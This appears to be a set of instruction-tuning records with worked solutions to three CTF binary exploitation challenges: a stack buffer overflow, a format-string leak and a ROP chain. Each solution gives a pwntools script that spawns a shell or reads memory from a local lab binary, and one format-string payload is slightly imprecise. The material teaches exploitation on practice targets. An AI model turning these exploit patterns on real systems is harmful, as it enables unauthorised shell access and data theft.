{"instruction": "Solve this binary exploitation challenge: Buffer Overflow", "input": "Challenge: Classic stack buffer overflow. Get shell.\n\nGiven Information:\nBinary: vuln (32-bit, no PIE, no canary)\nSource: char buf[64]; gets(buf);", "output": "Buffer Overflow Exploitation\n\n[ANALYSIS]\n- gets() is unsafe, reads unlimited input\n- 64-byte buffer, need to find offset to return address\n- No stack canary means no detection of overflow\n\n[OFFSET CALCULATION]\nUsed pattern_create to find offset:\n$ pattern_create 100 | ./vuln\nSegfault at 0x41346241\n$ pattern_offset 0x41346241\nOffset: 76\n\n[EXPLOITATION]\nReturn address at offset 76 (64 buf + 4 saved EBP + padding)\n\nWith NX disabled (shellcode):\npayload = b'A' * 76 + p32(buf_addr) + shellcode\n\nWith NX enabled (ret2libc):\npayload = b'A' * 76 + p32(system) + p32(exit) + p32(bin_sh)\n\n[PWNTOOLS SCRIPT]\n```python\nfrom pwn import *\np = process('./vuln')\nsystem = 0xf7e4c850  # Found via: p system in gdb\nbin_sh = 0xf7f6d33c  # strings -tx /lib32/libc.so.6 | grep /bin/sh\nexit = 0xf7e3fa40\n\npayload = b'A' * 76 + p32(system) + p32(exit) + p32(bin_sh)\np.sendline(payload)\np.interactive()\n```\n\n[FLAG]\n$ cat /flag.txt\nFLAG{buff3r_0v3rfl0w_m4st3r}"}
{"instruction": "Solve this binary exploitation challenge: Format String", "input": "Challenge: Format string vulnerability. Read flag from memory.\n\nGiven Information:\nBinary: fmt (32-bit)\nCode: printf(user_input);\nFlag loaded at: 0x0804a040", "output": "Format String Exploitation\n\n[ANALYSIS]\n- printf() with user-controlled format string\n- Can read/write arbitrary memory\n- Flag is at known address 0x0804a040\n\n[READING MEMORY]\nFormat specifiers access stack values:\nAAAA%08x.%08x.%08x... to leak stack\n\nDirect parameter access for arbitrary read:\n\\x40\\xa0\\x04\\x08%s reads string at 0x0804a040\n\n[EXPLOITATION]\n```python\nfrom pwn import *\np = process('./fmt')\n\n# Method 1: Direct address read\npayload = p32(0x0804a040) + b'%s'\np.sendline(payload)\nprint(p.recv())\n\n# Method 2: Find offset first\n# Send: AAAA%p.%p.%p.%p.%p.%p\n# Find where AAAA (0x41414141) appears, say position 7\n# Then: \\x40\\xa0\\x04\\x08%7$s\n```\n\n[FLAG EXTRACTION]\n$ python exploit.py\nFLAG{f0rm4t_str1ng_l34k}"}
{"instruction": "Solve this binary exploitation challenge: ROP Chain", "input": "Challenge: NX enabled, craft ROP chain to get shell.\n\nGiven Information:\nBinary: ropme (64-bit, NX, no PIE, no canary)\nOffset: 72 bytes\nUseful gadgets available", "output": "ROP Chain Exploitation\n\n[ANALYSIS]\n- NX prevents shellcode execution\n- Need to chain existing code gadgets\n- Goal: call system(\"/bin/sh\")\n\n[GADGET HUNTING]\n$ ROPgadget --binary ropme\n0x4007c3: pop rdi; ret\n0x4007c1: pop rsi; pop r15; ret\n0x400560: ret\n0x400510: puts@plt\n0x400520: system@plt\n\n[64-BIT CALLING CONVENTION]\nArguments: RDI, RSI, RDX, RCX, R8, R9\nsystem(\"/bin/sh\") needs RDI = &\"/bin/sh\"\n\n[EXPLOITATION]\n```python\nfrom pwn import *\nelf = ELF('./ropme')\np = process('./ropme')\n\npop_rdi = 0x4007c3\nret = 0x400560  # Stack alignment\nsystem = 0x400520\nbin_sh = next(elf.search(b'/bin/sh'))\n\npayload = b'A' * 72\npayload += p64(ret)        # Stack alignment for movaps\npayload += p64(pop_rdi)    # Pop next value into RDI\npayload += p64(bin_sh)     # Address of \"/bin/sh\"\npayload += p64(system)     # Call system()\n\np.sendline(payload)\np.interactive()\n```\n\n[FLAG]\n$ cat flag.txt\nFLAG{r0p_ch41n_m4st3r}"}
